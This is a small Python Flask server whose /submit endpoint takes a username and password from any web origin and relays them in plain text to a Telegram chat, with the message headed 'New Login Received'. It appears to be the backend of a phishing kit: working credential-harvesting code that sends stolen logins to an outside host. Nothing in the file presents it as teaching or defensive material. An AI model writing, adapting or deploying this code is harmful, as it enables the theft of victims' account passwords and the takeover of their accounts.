
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Get bot token from environment variable
BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    chat_id = data.get('chat_id')
    username = data.get('username')
    password = data.get('password')

    if not BOT_TOKEN:
        return jsonify({"error": "Bot token not set in environment"}), 500

    if not chat_id or not username or not password:
        return jsonify({"error": "Missing fields"}), 400

    message = f"🔐 New Login Received\n👤 Username: {username}\n🔑 Password: {password}"

    # Send message to Telegram
    response = requests.post(TELEGRAM_API, json={
        "chat_id": chat_id,
        "text": message
    })

    return jsonify({"status": "sent", "response": response.json()}), 200

@app.route('/')
def home():
    return "Bot backend is running!"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
